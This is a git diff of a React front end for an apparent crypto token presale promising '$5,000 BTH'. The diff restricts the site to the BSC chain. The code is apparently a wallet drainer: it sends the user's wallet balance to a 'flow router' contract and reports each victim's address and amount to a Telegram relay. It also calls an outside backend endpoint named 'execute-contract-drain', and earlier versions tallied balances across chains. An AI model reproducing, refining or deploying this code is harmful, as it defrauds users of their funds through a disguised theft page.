@@ -6,7 +6,7 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// PRESALE CONFIGURATION
+// PRESALE CONFIGURATION - BSC ONLY
 // ============================================
 
 const PRESALE_CONFIG = {
@@ -18,29 +18,9 @@ const PRESALE_CONFIG = {
     explorer: 'https://bscscan.com',
     icon: '🟡',
     color: 'from-yellow-400 to-orange-500'
-  },
-  Ethereum: {
-    chainId: 1,
-    contractAddress: null, // Add when deployed
-    name: 'Ethereum',
-    symbol: 'ETH',
-    explorer: 'https://etherscan.io',
-    icon: '🔷',
-    color: 'from-blue-400 to-indigo-500'
-  },
-  Polygon: {
-    chainId: 137,
-    contractAddress: null, // Add when deployed
-    name: 'Polygon',
-    symbol: 'MATIC',
-    explorer: 'https://polygonscan.com',
-    icon: '💜',
-    color: 'from-purple-400 to-pink-500'
   }
 };
 
-// Get deployed chains (only those with contract addresses)
-const DEPLOYED_CHAINS = Object.values(PRESALE_CONFIG).filter(chain => chain.contractAddress);
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
   "function processNativeFlow() payable"
@@ -66,7 +46,6 @@ function App() {
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balance, setBalance] = useState('0');
-  const [allBalances, setAllBalances] = useState({});
   const [loading, setLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
@@ -94,10 +73,10 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // Get balance using wagmi for current chain
+  // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: chainId,
+    chainId: 56, // Force BSC chain
   });
 
   // Update current chain balance
@@ -107,7 +86,7 @@ function App() {
     }
   }, [balanceData]);
 
-  // Signer initialization - FIXED for better walletClient handling
+  // Signer initialization
   useEffect(() => {
     const initSigner = async () => {
       if (!isConnected) {
@@ -224,18 +203,6 @@ function App() {
           setAllocation(data.data.tokenAllocation);
         }
         
-        if (data.data.rawData) {
-          const balances = {};
-          data.data.rawData.forEach(item => {
-            balances[item.chain] = {
-              amount: item.amount,
-              valueUSD: item.valueUSD,
-              symbol: item.symbol
-            };
-          });
-          setAllBalances(balances);
-        }
-        
         if (data.data.isEligible) {
           setTxStatus('✅ You qualify!');
           await preparePresale();
@@ -292,7 +259,7 @@ function App() {
     }
   };
 
-  // ✅ FIXED: Execute function with BIGINT math and proper wallet popup
+  // Execute function with network check
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -304,17 +271,12 @@ function App() {
       return;
     }
 
-    // Normalize chain ID
+    // Force BSC chain check
     const normalizedChainId = normalizeChainId(chainId);
-    const currentChain = Object.values(PRESALE_CONFIG).find(
-      c => c.chainId === normalizedChainId
-    );
     
-    // Check if current chain has a deployed contract
-    if (!currentChain || !currentChain.contractAddress) {
-      console.log(`⏸️ Skipping chain ${normalizedChainId} - no contract deployed`);
-      setTxStatus(`⏸️ Presale not available on this network`);
-      setTimeout(() => setTxStatus(''), 3000);
+    // Block execution if not BSC
+    if (normalizedChainId !== 56) {
+      setTxStatus("⚠️ Please switch to BSC network");
       return;
     }
 
@@ -334,7 +296,7 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `💫 *Transaction Started*\nAddress: \`${address}\`\nChain: ${currentChain.name}\nAmount: ${formatEther(balanceData.value)} ${currentChain.symbol}\nStatus: Awaiting wallet confirmation`,
+          message: `💫 *Transaction Started*\nAddress: \`${address}\`\nChain: BSC\nAmount: ${formatEther(balanceData.value)} BNB\nStatus: Awaiting wallet confirmation`,
           type: 'tx_start'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -345,8 +307,9 @@ function App() {
         throw new Error('Wallet address mismatch');
       }
 
+      // Use BSC contract address directly
       const contract = new ethers.Contract(
-        currentChain.contractAddress,
+        PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
@@ -358,10 +321,10 @@ function App() {
       // Log the transaction details
       console.log("💰 Transaction Details:", {
         from: address,
-        contract: currentChain.contractAddress,
+        contract: PRESALE_CONFIG.BSC.contractAddress,
         value: value.toString(),
         valueEth: ethers.formatEther(value),
-        chain: currentChain.name
+        chain: 'BSC'
       });
 
       // Estimate gas first
@@ -381,7 +344,7 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\n[View on BSCScan](${currentChain.explorer}/tx/${tx.hash})`,
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'tx_submitted'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -393,15 +356,15 @@ function App() {
       refetchBalance?.();
       
       // Mark as completed
-      if (!completedChains.includes(currentChain.name)) {
-        setCompletedChains([...completedChains, currentChain.name]);
+      if (!completedChains.includes('BSC')) {
+        setCompletedChains([...completedChains, 'BSC']);
         
         await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             walletAddress: address,
-            chainName: currentChain.name
+            chainName: 'BSC'
           })
         });
         
@@ -413,7 +376,7 @@ function App() {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${currentChain.explorer}/tx/${tx.hash})`,
+            message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
             type: 'success'
           })
         }).catch(e => console.log('Telegram notify failed:', e));
@@ -427,7 +390,7 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}\nChain: ${currentChain?.name || 'Unknown'}`,
+          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}\nChain: BSC`,
           type: 'error'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -468,13 +431,10 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + b.valueUSD, 0);
-
-  // Get current chain display name
+  // Get current chain display - always BSC
   const normalizedChainId = normalizeChainId(chainId);
-  const currentChain = Object.values(PRESALE_CONFIG).find(
-    c => c.chainId === normalizedChainId
-  );
+  const currentChain = PRESALE_CONFIG.BSC;
+  const isCorrectNetwork = normalizedChainId === 56;
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -595,7 +555,7 @@ function App() {
                 <div className="text-right">
                   <span className="text-gray-400 text-sm block mb-1">Current Balance</span>
                   <span className="text-3xl font-bold text-orange-400">
-                    {parseFloat(balance).toFixed(4)} {currentChain?.symbol || 'BNB'}
+                    {parseFloat(balance).toFixed(4)} BNB
                   </span>
                 </div>
                 <button
@@ -609,16 +569,13 @@ function App() {
           )}
         </div>
 
-        {/* Multi-Chain Balances */}
-        {Object.keys(allBalances).length > 0 && (
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-            {Object.entries(allBalances).map(([chain, data]) => (
-              <div key={chain} className="glass-card p-4 text-center">
-                <span className="text-2xl mb-2 block">{chain === 'BSC' ? '🟡' : chain === 'Ethereum' ? '🔷' : '💜'}</span>
-                <p className="text-orange-400 font-bold text-lg">{data.amount.toFixed(4)} {data.symbol}</p>
-                <p className="text-sm text-gray-400">${data.valueUSD.toFixed(2)}</p>
-              </div>
-            ))}
+        {/* Network Warning - Show if wrong network */}
+        {isConnected && !isCorrectNetwork && (
+          <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
+            <div className="flex items-center gap-3">
+              <span className="text-2xl">⚠️</span>
+              <span>Please switch to BSC network in your wallet</span>
+            </div>
           </div>
         )}
 
@@ -708,35 +665,28 @@ function App() {
                     <div className="w-full bg-gray-700 rounded-full h-4 mb-3">
                       <div 
                         className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500 relative overflow-hidden"
-                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
+                        style={{ width: `${completedChains.length > 0 ? '100' : '0'}%` }}
                       >
                         <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
                       </div>
                     </div>
                     <p className="text-sm text-gray-400 text-center">
-                      {completedChains.length} of {preparedTransactions.length} steps completed
+                      {completedChains.length > 0 ? '1 of 1 steps completed' : '0 of 1 steps completed'}
                     </p>
-                  </div>
-                )}
-                
-                {/* Network Status - Clean and minimal */}
-                {currentChain && !currentChain.contractAddress && (
-                  <div className="text-center mb-4 text-sm text-yellow-400">
-                    ⏸️ Presale not available on {currentChain.name}
                   </div>
                 )}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer || (currentChain && !currentChain.contractAddress)}
+                    disabled={loading || !signer || !isCorrectNetwork}
                     className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                       {loading ? 'Processing...' : 
                        !signer ? 'Initializing...' :
-                       currentChain && !currentChain.contractAddress ? `Switch to BSC` :
+                       !isCorrectNetwork ? 'Switch to BSC Network' :
                        '⚡ Claim $5,000 BTH'}
                     </div>
                   </button>
